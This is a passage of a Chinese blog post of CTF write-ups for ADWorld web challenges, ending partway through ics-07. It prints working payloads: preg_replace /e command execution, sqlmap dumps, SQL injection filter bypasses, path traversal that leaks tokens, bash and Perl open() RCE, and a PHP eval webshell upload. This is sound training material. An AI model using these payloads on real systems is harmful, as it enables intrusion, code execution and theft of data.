<html>

<head>
  <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>攻防世界 ADWorld Web 部分题解（1） | 3ND</title>
<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627869141145">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="攻防世界 ADWorld Web 部分题解（1） | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="0x01 Cat
XCTF 4th-WHCTF-2017 抓住那只猫

fuzz url, 得到如下结果：


127.0.0.1 / 39.156.69.79(baidu.com)，返回 ping 结果。


非法 URL (特殊字符)，..." />
    <meta name="keywords" content="Writeup,CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
    <script src="/media/highlight.min.js"></script>
</head>

<body>
  <div class="main">
    <div class="main-content">
      <div class="site-header">
  <a href="https://3nd.xyz">
  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627869141145" alt="">
  </a>
  <h1 class="site-title">
    3ND
  </h1>
  <p class="site-description">
    夏が終わった
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives" class="menu">
          归档
        </a>
      
    
      
        <a href="/tags" class="menu">
          标签
        </a>
      
    
      
        <a href="/post/about" class="menu">
          关于
        </a>
      
    
  </div>
  <div class="social-container">
    <a href="https://github.com/inspiringz" target="_blank">
      <i class="ri-github-fill"></i>
    </a>
    <a href="mailto:z@3nd.xyz" target="_blank">
      <i class="ri-mail-send-fill"></i>
  </a>
  <a href="#">
    <i class="ri-fire-fill"></i>
</a>
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              攻防世界 ADWorld Web 部分题解（1）
            </h2>
            <div class="post-info">
              <span>
                2019-09-11
              </span>
              <span>
                28 min read
              </span>
              <span class="page-view" key="20190911210003" title="攻防世界 ADWorld Web 部分题解（1）">
              </span>
              
                <a href="https://3nd.xyz/tag/writeup/" class="post-tag">
                  # Writeup
                </a>
                
                <a href="https://3nd.xyz/tag/ctf/" class="post-tag">
                  # CTF
                </a>
                
            </div>
            
                <div class="post-content-wrapper">
                  <div class="post-content">
                    <h2 id="0x01-cat">0x01 Cat</h2>
<p>XCTF 4th-WHCTF-2017 抓住那只猫</p>
<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/20190913225151.png" alt="" loading="lazy"></figure>
<p>fuzz url, 得到如下结果：</p>
<ol>
<li>
<p>127.0.0.1 / 39.156.69.79(baidu.com)，返回 ping 结果。</p>
</li>
<li>
<p>非法 URL (特殊字符)，返回 <code>Invalid URL</code>。</p>
</li>
<li>
<p><code>%80 %81 ...</code>，返回 Django 报错信息。</p>
</li>
</ol>
<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/20190913232133.png" alt="" loading="lazy"></figure>
<p>在 Request information/Settings 中观察到 DATABASES 项信息为:</p>
<pre><code class="language-bash">'default': {'ATOMIC_REQUESTS': False,
             'AUTOCOMMIT': True,
             'CONN_MAX_AGE': 0,
             'ENGINE': 'django.db.backends.sqlite3',
             'HOST': '',
             'NAME': '/opt/api/database.sqlite3',
             'OPTIONS': {},
             'PASSWORD': u'********************',
             'PORT': '',
             'TEST': {'CHARSET': None,
                      'COLLATION': None,
                      'MIRROR': None,
                      'NAME': None},
             'TIME_ZONE': None,
             'USER': ''\}\}
</code></pre>
<p>由 Django DEBUG Mode 判断出后端架构为 Python/Django，猜测PHP层的处理逻辑可能为 <code>cURL</code>。</p>
<p>cURL 中当 <code>CURL_SAFE_UPLOAD = false</code> 的时候，以 <code>@</code> 开头的 value 就会被当做文件上传，造成任意文件读取。当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。</p>
<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/20190913232900.png" alt="" loading="lazy"></figure>
<p>尝试读取 <code>/opt/api/database.sqlite3</code> 数据库内容。</p>
<pre><code class="language-bash">$ curl '111.198.29.45:32546/index.php?url=@/opt/api/database.sqlite3' | xxd | grep -A 5 -B 5 CTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8128    0  8128    0     0   6911      0 --:--:--  0:00:01 --:--:--  6911
00019ac0: 5c78 3030 5c78 3030 5c78 3030 5c78 3030  \x00\x00\x00\x00
00019ad0: 5c78 3030 5c78 3030 5c78 3030 5c78 3030  \x00\x00\x00\x00
00019ae0: 5c78 3030 5c78 3030 5c78 3030 5c78 3030  \x00\x00\x00\x00
00019af0: 5c78 3030 5c78 3030 5c78 3030 5c78 3030  \x00\x00\x00\x00
00019b00: 5c78 3030 5c78 3163 5c78 3031 5c78 3032  \x00\x1c\x01\x02
00019b10: 4157 4843 5446 7b79 6f6f 6f6f 5f53 7563  AWHCTF{yoooo_Suc
00019b20: 685f 415f 4730 3044 5f40 7d5c 6e26 616d  h_A_G00D_@}\n&amp;am
00019b30: 703b 2333 393b 266c 743b 2f70 7265 2667  p;#39;&amp;lt;/pre&amp;g
00019b40: 743b 266c 743b 2f74 6426 6774 3b0a 2020  t;&amp;lt;/td&amp;gt;.  
00019b50: 2020 2020 2020 2020 2020 2020 2020 266c                &amp;l
00019b60: 743b 2f74 7226 6774 3b0a 2020 2020 2020  t;/tr&amp;gt;.      
100  144k    0  144k    0     0  97142      0 --:--:--  0:00:01 --:--:-- 97142
</code></pre>
<p>获取 <code>WHCTF{yoooo_Such_A_G00D_@}</code>.</p>
<h2 id="0x02-ics-05">0x02 ics-05</h2>
<p>XCTF 4th-CyberEarth 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p>
<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/20190913234217.png" alt="" loading="lazy"></figure>
<p>在<strong>设备维护中心</strong>观察到 URL 如下:</p>
<pre><code class="language-bash">http://111.198.29.45:31588/index.php?page=index
</code></pre>
<p>测试 <code>php://filter</code> 读取文件：</p>
<pre><code class="language-bash">http://111.198.29.45:31588/index.php?page=php://filter/convert.base64-encode/resource=index.php
</code></pre>
<p>在读取到的代码中观察到关键片段如下:</p>
<pre><code class="language-php">&lt;?php
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;
    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];
    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }
}
?&gt;
</code></pre>
<p>在 PHP 5.5 中 preg_replace() 函数 中 $pattern 存在 <code>/e</code> 模式修正符时，会把 $replacement 当做 PHP 代码执行。</p>
<pre><code class="language-php">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/20190913235245.png" alt="" loading="lazy"></figure>
<p>Payload:</p>
<pre><code class="language-php">http://111.198.29.45:31588/index.php?pat=/(.*)/e&amp;rep=system(%27cat+s3chahahaDir/flag/flag.php%27)&amp;sub=a
</code></pre>
<p>获取到 <code>cyberpeace{52ccd199b809d829873ec760128d2212}</code>.</p>
<h2 id="0x03-newscenter">0x03 NewsCenter</h2>
<p>XCTF 4th-QCTF-2018</p>
<pre><code class="language-bash">sqlmap -u &quot;http://111.198.29.45:46407/&quot; --forms -D news --tables -T secret_table --dump
</code></pre>
<p>获取到 <code>QCTF{sq1_inJec7ion_ezzz}</code>。</p>
<h2 id="0x04-nannannannan-batman">0x04 NaNNaNNaNNaN-Batman</h2>
<p>tinyctf-2014</p>
<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/20190914102330.png" alt="" loading="lazy"></figure>
<p>修改后缀为 <code>.html</code> 打开为一个输入框，修改<code>eval</code>为<code>alert</code>获取代码。</p>
<pre><code class="language-js">function $() {
    var e = document.getElementById(&quot;c&quot;).value;
    if (e.length == 16)
        if (e.match(/^be0f23/) != null)
            if (e.match(/233ac/) != null)
                if (e.match(/e98aa$/) != null)
                    if (e.match(/c7be9/) != null) {
                        var t = [&quot;fl&quot;, &quot;s_a&quot;, &quot;i&quot;, &quot;e}&quot;];
                        var n = [&quot;a&quot;, &quot;_h0l&quot;, &quot;n&quot;];
                        var r = [&quot;g{&quot;, &quot;e&quot;, &quot;_0&quot;];
                        var i = [&quot;it'&quot;, &quot;_&quot;, &quot;n&quot;];
                        var s = [t, n, r, i];
                        for (var o = 0; o &lt; 13; ++o) {
                            document.write(s[o % 4][0]);
                            s[o % 4].splice(0, 1)
                        }
                    }
}
document.write('&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;');
delete _
</code></pre>
<p>获取到 <code>flag{it's_a_h0le_in_0ne}</code>。</p>
<h2 id="0x05-upload">0x05 upload</h2>
<p>RCTF-2015</p>
<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/20190914164359.png" alt="" loading="lazy"></figure>
<p>看上去是个注入题目，其实是个注入题目。在文件名处存在<code>insert</code>注入，直接进行报错或者延时注入时回显<code>sqlinject find</code>，这里可以利用<strong>二次注入</strong>来获取数据。</p>
<pre><code class="language-sql">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....)...
</code></pre>
<p>经 fuzz 发现过滤了 <code>select</code>、<code>from</code>、<code>and</code>等关键字，可以通过双写绕过。</p>
<pre><code class="language-sql">'+concat((selselectect version()))+'.jpg -&gt; 5.6
'+concat((selselectect database()))+'.jpg -&gt; 0 题目限制:只能返回数字
</code></pre>
<p>这里可以考虑简单把要获取字符串转化为16进制后转为10进制数字带出，为避免数值太大溢出可配合 <code>substr()</code> 进行截取。</p>
<p>Payload:</p>
<pre><code class="language-sql"># conv(substr(hex()))
0'+(seleselectct conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg
</code></pre>
<p>最终获得 DB: web_upload / Table: hello_flag_is_here / C: i_am_flag / flag: <code>!!_@m_Th.e_F!lag</code>。</p>
<p>通过fuzz发现，在进行 <code>insert</code> 操作的时候有三个列，所以构造：</p>
<pre><code class="language-sql">文件名','uid','uid'),((database()),'uid','uid')#.jpg
</code></pre>
<p>就可以看到回显的数据，然后通过走流程就可以查询出flag。</p>
<h2 id="0x06-php2">0x06 PHP2</h2>
<p>Can you anthenticate to this website?</p>
<p>在 <code>index.phps</code> 下获取源码如下:</p>
<pre><code class="language-php">&lt;?php
if(&quot;admin&quot;===$_GET[id]) {
  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == &quot;admin&quot;)
{
  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
}
?&gt;

Can you anthenticate to this website?
</code></pre>
<p>二次编码<code>admin</code>-&gt; <code>%2561%2564%256d%2569%256e</code> 绕过即可，获取到 <code>cyberpeace{58622be0df2feba16400764dde8cfa1b}</code>。</p>
<h2 id="0x07-bug">0x07 BUG</h2>
<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/20190914171606.png" alt="" loading="lazy"></figure>
<p>可以通过找回密码最后重置密码的时候修改用户名即可重置<code>admin</code>密码。</p>
<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/20190914172140.png" alt="" loading="lazy"></figure>
<blockquote>
<p>同时发现 Cookie 中的 user字段为md5, format 为 <strong>md5(UID:账号)</strong>，md5(1:admin) 即为 admin cookie.</p>
</blockquote>
<p>登录 admin 账户，修改 <code>X-Forwarded-For: 127.0.0.1</code> 即可访问 <code>Manage</code> 模块。</p>
<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/20190914172624.png" alt="" loading="lazy"></figure>
<p>在网页源代码中获取 Hint：</p>
<pre><code class="language-html">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;
</code></pre>
<p>结合 module=filemanage 猜测 <code>do=upload</code>:</p>
<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/20190914172905.png" alt="" loading="lazy"></figure>
<p>fuzz 发现 upload 做了以下限制：</p>
<ol>
<li>file extension</li>
</ol>
<pre><code class="language-php">php -&gt; It is a php!
php3 -&gt; You know what I want!
php5 -&gt; It is not a really php file!
phtml -&gt; You know what I want!
</code></pre>
<ol start="2">
<li>
<p>content-type -&gt; <code>image/jpeg</code></p>
</li>
<li>
<p>php tag</p>
</li>
</ol>
<pre><code class="language-php">&lt;?php -&gt; Something shows it is a php!
</code></pre>
<p><code>.php5</code> + <code>&lt;script language=&quot;php&quot;&gt; phpinfo(); &lt;/script&gt;</code> 获取到 <code>cyberpeace{f1ae157a8ec8212b991da36c902698f3}</code>。</p>
<h2 id="0x08-web2">0x08 web2</h2>
<pre><code class="language-php">&lt;?php
$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;

function encode($str){
    $_o=strrev($str);
    // echo $_o;
        
    for($_0=0;$_0&lt;strlen($_o);$_0++){
       
        $_c=substr($_o,$_0,1);
        $__=ord($_c)+1;
        $_c=chr($__);
        $_=$_.$_c;   
    } 
    return str_rot13(strrev(base64_encode($_)));
}

highlight_file(__FILE__);
/*
   逆向加密算法，解密$miwen就是flag
*/
?&gt;
</code></pre>
<p>encode 流程分析:</p>
<pre><code class="language-bash">strrev() -&gt; ord()+1 -&gt; base64_encode() -&gt; strrev() -&gt; str_rot13()
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/20190914180334.png" alt="" loading="lazy"></figure>
<p>ROT13透过与其成对的13个字母一对一置换，如HELLO变成URYYB（或者将之解码，URYYB再度变回HELLO）。ROT13是它自己本身的逆反，也就是说，要还原ROT13，套用加密同样的算法即可得，故同样的操作可用再加密与解密。</p>
<p>易得出 decode 流程:</p>
<pre><code class="language-bash">rot13() -&gt; strrev() -&gt; base64_decode() -&gt; ord()-1 -&gt; strrev()
</code></pre>
<p>Payload:</p>
<pre><code class="language-php">&lt;?php
$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
function decode($str){
    $_o=str_rot13($str);
    $_o=strrev($_o);
    $_o=base64_decode($_o);
    for($_0=0;$_0&lt;strlen($_o);$_0++){
        $_c=substr($_o,$_0,1);
        $__=ord($_c)-1;
        $_c=chr($__);
        $_=$_.$_c;
    }
    return strrev($_);
}
echo decode($miwen);
</code></pre>
<p>获得 <code>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</code>。</p>
<h2 id="0x09-wtfsh-150">0x09 wtf.sh-150</h2>
<p>csaw-ctf-2016-quals</p>
<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/20190915141442.png" alt="" loading="lazy"></figure>
<p>题目环境是一个轻量级的论坛，有登录、注册、发表文章、发表评论几项功能点。</p>
<p>fuzz 发现 <code>post.wtf</code> 页面的 <code>post</code> 参数存在路径穿越：</p>
<figure data-type="image" tabindex="14"><img src="https://3nd.xyz/post-images/move/20190915142323.png" alt="" loading="lazy"></figure>
<p>格式化代码：</p>
<pre><code class="language-sh">&lt;html&gt;
&lt;head&gt;
    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/css/std.css&quot; &gt;
&lt;/head&gt;
$ if contains 'user' ${!URL_PARAMS[@]} &amp;&amp; file_exists &quot;users/${URL_PARAMS['user']}&quot;
$ then
$   local username=$(head -n 1 users/${URL_PARAMS['user']});
$   echo &quot;&lt;h3&gt;${username}'s posts:&lt;/h3&gt;&quot;;
$   echo &quot;&lt;ol&gt;&quot;;
$   get_users_posts &quot;${username}&quot; | while read -r post; do
$       post_slug=$(awk -F/ '{print $2 &quot;#&quot; $3}' &lt;&lt;&lt; &quot;${post}&quot;);
$       echo &quot;&lt;li&gt;&lt;a href=\&quot;/post.wtf?post=${post_slug}\&quot;&gt;$(nth_line 2 &quot;${post}&quot; | htmlentities)&lt;/a&gt;&lt;/li&gt;&quot;;
$   done 
$   echo &quot;&lt;/ol&gt;&quot;;
$   if is_logged_in &amp;&amp; [[ &quot;${COOKIES['USERNAME']}&quot; = 'admin' ]] &amp;&amp; [[ ${username} = 'admin' ]]
$   then
$       get_flag1
$   fi
$ fi
&lt;/html&gt;
</code></pre>
<p>在这段代码中我们可以看到当用户 <code>admin</code> 访问他的个人页面 <code>profile.wtf</code> 时 <code>get_flag1</code> 方法将被调用:</p>
<pre><code class="language-sh">$   if is_logged_in &amp;&amp; [[ &quot;${COOKIES['USERNAME']}&quot; = 'admin' ]] &amp;&amp; [[ ${username} = 'admin' ]]
$   then
$       get_flag1
</code></pre>
<p>同时在泄露的源代码中我们观察到存在 <code>users</code> 目录，尝试路径穿越读取：</p>
<pre><code class="language-bash">http://111.198.29.45:56854/post.wtf?post=../users/
</code></pre>
<figure data-type="image" tabindex="15"><img src="https://3nd.xyz/post-images/move/20190915143133.png" alt="" loading="lazy"></figure>
<p>获取到 <code>admin</code> 用户的 SHA1 和 TOKEN: <code>uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==</code>.</p>
<p>修改 Cookie 中的 username 和 TOKEN 即可登录 admin 用户，在 <code>profile.wtf</code> 中获取到: <code>xctf{cb49256d1ab48803</code>.</p>
<p>挑战的第二部分有点复杂。 我们不得不调用<code>get_flag2</code>，但我们获取的代码不包含任何引用。</p>
<p>继续审计代码，在<code>wtf.sh</code>中发现一个解析和执行<code>.wtf</code>文件的函数：</p>
<pre><code class="language-sh">max_page_include_depth=64
page_include_depth=0
function include_page {
    # include_page pathname
    local pathname=$1
    local cmd=
    [[ ${pathname(-4)} = '.wtf' ]];
    local can_execute=$;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
        local line;
        while read -r line; do
            # check if we're in a script line or not ($ at the beginning implies script line)
            # also, our extension needs to be .wtf
            [[ $ = ${line01} &amp;&amp; ${can_execute} = 0 ]];
            is_script=$;
            # execute the line.
            if [[ $is_script = 0 ]]
            then
                cmd+=$'n'${line#$};
            else
                if [[ -n $cmd ]]
                then
                    eval $cmd  log Error during execution of ${cmd};
                    cmd=
                fi
                echo $line
            fi
        done  ${pathname}
    else
        echo pMax include depth exceeded!p
    fi
}
</code></pre>
<p>如果我们能够上传自己构造的 <code>.wtf</code> 文件的话，即可 GETShell，继续审计代码，在 <code>post_functions.sh</code> 中留意到<code>replay</code>函数：</p>
<pre><code class="language-sh">function reply {
    local post_id=$1;
    local username=$2;
    local text=$3;
    local hashed=$(hash_username &quot;${username}&quot;);
    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
    next_reply_id=$(awk '{print $1+1}' &lt;&lt;&lt; &quot;${curr_id}&quot;);
    next_file=(posts/${post_id}/${next_reply_id});
    echo &quot;${username}&quot; &gt; &quot;${next_file}&quot;;
    echo &quot;RE: $(nth_line 2 &lt; &quot;posts/${post_id}/1&quot;)&quot; &gt;&gt; &quot;${next_file}&quot;;
    echo &quot;${text}&quot; &gt;&gt; &quot;${next_file}&quot;;
    # add post this is in reply to to posts cache
    echo &quot;${post_id}/${next_reply_id}&quot; &gt;&gt; &quot;users_lookup/${hashed}/posts&quot;;
}
</code></pre>
<p>当我们回复帖子时通过GET方法提交了一个 <code>post</code> 参数，此参数也存在着<strong>目录穿越</strong>漏洞，我们可以通过这里自定义上传文件的文件名从而写入<code>.wtf</code>。 该函数还在文件的第一行写了用户名。 因此，如果我们只是注册了一个包含有效shell命令的用户名，并将其写入<code>.wtf</code>后缀文件到我们可以访问该文件的目录中，即可达成RCE。幸运的是，<code>users_lookup</code>文件没有包含<code>.noread</code>文件，因此我们可以将<code>.wtf文</code>件写入<code>users_lookup</code>目录下。</p>
<p>应用程序允许注册包含特殊字符的用户，例如<code>$</code>，但是包含空格的用户名是不被允许的。 但是，因为 bash 允许执行没有空格的命令(e.g. {cat,/etc/passwd})，所以我们可以通过注册 <code>${find,/,-iname,get_flag2}</code> 用户并使用以下请求创建了回复即可获取 flag2.</p>
<pre><code class="language-sh">POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: 111.198.29.45:48634
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==

text=asd&amp;submit=
</code></pre>
<p>这里<code>%09</code>为水平制表符，用于在<code>reply</code>函数中达成绕过从而作为文件写入而非目录，获取到响应如下。</p>
<pre><code class="language-sh">GET /users_lookup/sh.wtf HTTP/1.1
Host: 111.198.29.45:48634
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==

HTTP/1.1 200 OK
[...]
/usr/bin/get_flag2
RE:
asd
</code></pre>
<p>由此 <code>get_flag2</code> 是 <code>/usr/bin/</code> 下的一个二进制文件。我们现在只需要创建用户<code>$/usr/bin/get_flag2</code> 并再次发送回复请求即可：</p>
<figure data-type="image" tabindex="16"><img src="https://3nd.xyz/post-images/move/20190915152339.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://3nd.xyz/post-images/move/20190915152358.png" alt="" loading="lazy"></figure>
<p>获取到 <code>149e5ec49d3c29ca}</code>=&gt; <code>xctf{cb49256d1ab48803149e5ec49d3c29ca}</code>.</p>
<h2 id="0x0a-i-got-id-200">0x0A i-got-id-200</h2>
<p>csaw-ctf-2016-quals</p>
<p>Wtf... I literally just setup this website and it's already popped...</p>
<p>这个挑战非常有趣，主要考点在于<a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">Blackhat Asia 2016</a>上所讲述的 <strong>Perl 5 Vulnerable</strong>。</p>
<figure data-type="image" tabindex="18"><img src="https://3nd.xyz/post-images/move/20190916165926.png" alt="" loading="lazy"></figure>
<p>题目环境非常简单，我们把目光锁定在 <code>file.pl</code>，此页面允许我们上传任意后缀的文件，然后打印所上传的文件内容：</p>
<figure data-type="image" tabindex="19"><img src="https://3nd.xyz/post-images/move/20190916170051.png" alt="" loading="lazy"></figure>
<p>根据此页面的功能，我们猜测后端代码可能如下：</p>
<pre><code class="language-perl">use strict;
use warnings;
use CGI;
 
my $cgi= CGI-&gt;new;
if ( $cgi-&gt;upload( 'file' ) )
{
my $file= $cgi-&gt;param( 'file' );
while ( &lt;$file&gt; ) { print &quot;$_&quot;; } }
</code></pre>
<p>所以问题出在哪里呢？关注如下代码：</p>
<pre><code class="language-perl">my $file= $cgi-&gt;param( 'file' )
</code></pre>
<p><code>param()</code>函数返回一个<strong>包含所有参数值的列表</strong>，但<strong>只插入第一个值到</strong><code>$file</code>，紧接着：</p>
<pre><code class="language-perl">while ( &lt;$file&gt;)
</code></pre>
<p><a href="https://perlmaven.com/the-diamond-operator"><code>&lt;&gt;</code></a> 被称作<strong>钻石运算符</strong>（Diamond operator），它允许我们迭代命令行上给出的所有文件中的行。</p>
<figure data-type="image" tabindex="20"><img src="https://3nd.xyz/post-images/move/20190916172745.png" alt="" loading="lazy"></figure>
<p><code>&lt;&gt;</code>不适用于 strings 除非此字符串为命令行参数&quot;<code>ARGV</code>&quot;，它将遍历每个 ARG 值并作为参数传递给 <code>open()</code> 调用。</p>
<p><strong>=&gt;我们可以通过指定 <code>$file</code> 标量值来代替上传文件描述符，从而达成任意文件读取。</strong></p>
<figure data-type="image" tabindex="21"><img src="https://3nd.xyz/post-images/move/20190916174047.png" alt="" loading="lazy"></figure>
<p>下面我们有两种方式可以获取到 flag.</p>
<p><strong>1.简单幸运的方法</strong>：<code>猜</code></p>
<p>flag 就位于 <code>/flag</code>：</p>
<figure data-type="image" tabindex="22"><img src="https://3nd.xyz/post-images/move/20190916174306.png" alt="" loading="lazy"></figure>
<p><strong>2.“黑客”的方式：</strong><code>RCE</code></p>
<p>Perl 中的 <code>open()</code> 函数同样可以用于执行代码，因为它之前被用来打开<strong>管道</strong>（pipes），我们可以使用 <code>|</code> 作为分隔符，因为 Perl 识别到 <code>|</code> 表示 <code>open()</code> 正在打开一个管道。 攻击者可以劫持 <code>open()</code> 调用，通过添加 <code>|</code> 来执行命令。</p>
<p>Payload:</p>
<pre><code class="language-sh"># 空格 %20 urlenode传输
# ${IFS} Internal Field Seprator 内部域分隔符
/bin/bash%20-c%20ls${IFS}/|
/bin/bash%20-c%20cat${IFS}/flag|
</code></pre>
<figure data-type="image" tabindex="23"><img src="https://3nd.xyz/post-images/move/20190916175607.png" alt="" loading="lazy"></figure>
<h2 id="0x0b-ics-07">0X0B ics-07</h2>
<p>XCTF 4th-CyberEarth 工控云管理系统项目管理页面解析漏洞</p>
<figure data-type="image" tabindex="24"><img src="https://3nd.xyz/post-images/move/20190916180246.png" alt="" loading="lazy"></figure>
<p>在管理页面发现<code>/view-source.php</code>可以获取源代码，三段 PHP 代码分别如下：</p>
<pre><code class="language-php">&lt;?php
session_start();
if (!isset($_GET[page])) {
  show_source(__FILE__);
  die();
}
if (isset($_GET[page]) &amp;&amp; $_GET[page] != 'index.php') {
  include('flag.php');
} else {
  header('Location: ?page=flag.php');
}
?&gt;
</code></pre>
<p>从这段代码中了解到 flag 位于 <code>flag.php</code>，可以通过设置 <code>page=flag.php</code> 来包含 flag.php.</p>
<pre><code class="language-php">&lt;?php
if ($_SESSION['admin']) {
    $con = $_POST['con'];
    $file = $_POST['file'];
    $filename = &quot;backup/&quot;.$file;
    if (preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)) {
        die(&quot;Bad file extension&quot;);
    } else {
        chdir('uploaded');
        $f = fopen($filename, 'w');
        fwrite($f, $con);
        fclose($f);
    }
}
?&gt;
</code></pre>
<p>这段代码的功能是通过 POST 的方法上传文件，由 <code>con</code> 指定文件内容、<code>file</code> 指定文件名，通过正则匹配文件名后缀过滤了以下后缀（不区分大小写）：</p>
<pre><code class="language-php">php php3 php4 php5 php7 pht phtml
</code></pre>
<p>如何突破文件后缀名的限制? 主要思路有如下三点：</p>
<ol>
<li>
<p>Web中间件的解析漏洞 , 因为已经知道中间件是<code>Apache2</code> , 使用的是<code>PHP</code> . 所以无非就是<code>Apache</code>解析漏洞或者<code>PHP CGI</code>解析漏洞</p>
</li>
<li>
<p>通过上传<code>.htaccess</code>文件 , 该文件是<code>Apache</code>的一大特色 . 其中一个功能便是修改不同<code>MIME</code>类型文件使用的解析器 . 但要使用该功能需要<code>Apache</code>在配置文件中设置<code>AllowOverride All</code> , 并且启用<code>Rewrite</code>模块 , eg:</p>
</li>
</ol>
<pre><code class="language-xml">&lt;FilesMatch &quot;shell.jpg&quot;&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
# 此时, shell.jpg 会被解析为PHP文件
</code></pre>
<ol start="3">
<li>特殊文件后缀, 想要解析PHP文件, 并非后缀要是*.php. 如果查看mime.types, 会发现很多文件后缀都使用了 <code>application/x-httpd-php</code> 这个解析器：</li>
</ol>
<figure data-type="image" tabindex="25"><img src="https://3nd.xyz/post-images/move/20190916184358.png" alt="" loading="lazy"></figure>
<p>其中 <code>phps</code> 和 <code>php3p</code> 都是源代码文件, 无法被执行. 而剩下所有的后缀都被正则表过滤, 所以这种方式无法成功上传可执行文件.</p>
<p>所以最后还是回到了<strong>中间件解析漏洞</strong>上 , 但是经过测试发现并不是常规的解析漏洞 , 而是利用了一个<strong>Linux的目录结构特性</strong>, 如下:</p>
<pre><code class="language-sh">~ $ mkdir 1.php
~ $ mkdir ~/1.php/2.php/
~ $ cd ~/1.php/2.php/..
~/1.php $ ls -la
drwxr-xr-x  3 .
drwxr-xr-x 21 ..
drwxr-xr-x  2 2.php
</code></pre>
<p>创建了一个目录为 1.php, 在 1.php 下创建了一个子目录为 2.php. Linux 下每创建一个新目录 , 都会在其中自动创建两个隐藏文件：<code>.</code> 和 <code>..</code>。</p>
<p>其中 <code>.</code> 代表当前目录 ，<code>..</code> 代表当前目录的父目录 , 访问 <code>./1.php/2.php/..</code> 代表访问 2.php 的父目录 , 也就是访问 <code>1.php</code>. 这里上传 Shell 可以用这个特性来 bypass，Payload如下：</p>
<pre><code>con=&lt;?php @eval($_POST[0]);?&gt;&amp;file=shell.php/.
</code></pre>
<p>如果获取到 <code>$_SESSION['admin']</code> 则可以通过此功能上传 Webshell，让我们来看一下第三段代码：</p>
<pre><code class="language-php">&lt;?php
if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9') {
    include 'config.php';
    $id = mysql_real_escape_string($_GET[id]);
    $sql=&quot;select * from cetc007.user where id='$id'&quot;;
    $result = mysql_query($sql);
    $result = mysql_fetch_object($result);
} else {
